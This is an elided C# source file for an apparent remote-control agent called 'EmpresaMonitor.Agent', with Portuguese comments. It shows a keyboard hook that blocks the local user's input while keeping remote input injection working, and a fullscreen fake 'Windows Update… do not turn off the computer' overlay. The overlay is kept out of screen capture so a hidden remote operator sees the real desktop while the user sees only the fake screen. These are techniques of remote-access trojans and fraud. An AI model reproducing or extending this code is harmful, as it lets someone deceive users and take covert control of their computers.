...
namespace EmpresaMonitor.Agent
{
    internal static class Program
    {
        ...
        static void Main()
        {
            ...
            AppDomain.CurrentDomain.ProcessExit += (_, __) =>
            {
                ...
                try { LocalInputBlocker.SetLocked(false); } catch { }
                try { LocalInputBlocker.Uninstall(); } catch { }
                    ...
                    switch (type)
                    {
                        ...
                        case "permission_state":
                            ...
                            if (!state.InputLocked) {
                                LocalInputBlocker.SetLocked(false);
                        ...
                        case "screen_overlay":
                            _ = HandleScreenOverlayAsync(socket, state, root);
                            break;
        ...
        static async Task HandleScreenOverlayAsync(ClientWebSocket socket, AgentState state, JsonElement root)
        {
            var requestId = GetString(root, "requestId");
            var mode = GetString(root, "mode", "").Trim().ToLowerInvariant();
            var log = new List<string>();
            ...
            try
            {
                await Task.Run(() => ScreenOverlay.Apply(mode));
        ...
        static async Task SetInputLock(bool lockStatus, ClientWebSocket socket, AgentState state)
        {
            try
            {
                ...
                bool blocked = LocalInputBlocker.SetLocked(true);
        ...
        static async Task CaptureLoop(AgentState state)
        {
            ...
            try
            {
                while (!state.Lifetime.IsCancellationRequested)
                {
                    ...
                    // Overlay ativo: no Win10 2004+ (build 19041+) o overlay é excluído da
                    // captura pelo próprio WDA_EXCLUDEFROMCAPTURE — não se oculta nada, o
                    // overlay fica FIXO para o usuário local (sem piscar) e o CopyFromScreen
                    // continua mostrando a tela real ao operador. Em builds antigos (<19041,
                    // que ignoram o flag) mantém o hide/show só no instante da captura.
                    var overlayActive = ScreenOverlay.IsActive && !ScreenOverlay.CaptureExcludesOverlay;
                    if (overlayActive) ScreenOverlay.SuspendForCapture();
                    try
                    {
                    ...
                    {
                        if (overlayActive) ScreenOverlay.ResumeAfterCapture();
                    }
                    try
                    {
    ...
    // ---------------------------------------------------------------------------
    // LocalInputBlocker — bloqueio de input local que PRESERVA a injeção remota.
    ...
    // ---------------------------------------------------------------------------
    internal static class LocalInputBlocker
    {
        ...
        public static void Install()
        {
            lock (sync)
            {
                ...
                kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, kbdProc, hMod, 0);
    ...
    // ---------------------------------------------------------------------------
    // ScreenOverlayForm — overlay fullscreen usado pelo comando de ocultação de tela.
    // Modos:
    ...
    // Comportamento (mesma lógica do LocalInputBlocker aplicada à tela):
    ...
    //     e, no Win10 2004+ (build 19041+), o DWM a exclui também da captura GDI
    //     (CopyFromScreen) — nada é ocultado durante o frame. Em builds mais antigos
    //     (<19041), que ignoram o flag, o CaptureLoop usa o fallback
    //     ScreenOverlay.SuspendForCapture/ResumeAfterCapture (hide/show por frame).
    // ---------------------------------------------------------------------------
    internal sealed class ScreenOverlayForm : Form
    {
        ...
        public void Apply(string requestedMode)
        {
            ...
            ScreenOverlay.SetActive(requestedMode != "off");
        ...
        void DrawUpdate(Graphics g)
        {
            ...
            const string title = "Atualizando o Windows";
            var sub = $"{percent}% concluído";
            const string warn = "Não desligue o computador.";
    ...
    // ---------------------------------------------------------------------------
    // ScreenOverlay — despachante para o ScreenOverlayForm. Não depende do state.Ui
    ...
    internal static class ScreenOverlay
    {
        ...
        // No Win10 2004+ (build 19041+) o DWM exclui janelas marcadas com
        // WDA_EXCLUDEFROMCAPTURE TAMBÉM da captura GDI (CopyFromScreen/BitBlt do DC da
        // tela). Nesses builds o overlay não precisa ser ocultado durante a captura:
        // ele fica 100% fixo para o usuário local e o frame remoto mostra a tela real.
        // Em builds antigos (que tratam o flag como WDA_MONITOR) mantém o hide/show.
        public static readonly bool CaptureExcludesOverlay =
        ...
        // Usado SOMENTE em builds antigos (< Win10 2004), onde a captura GDI não honra
        // WDA_EXCLUDEFROMCAPTURE: oculta o overlay apenas pelo instante da captura.
        // No Win10 2004+ (build 19041+) o DWM já exclui o overlay do CopyFromScreen e
        // este método não é chamado — o overlay fica fixo, sem piscar na tela.
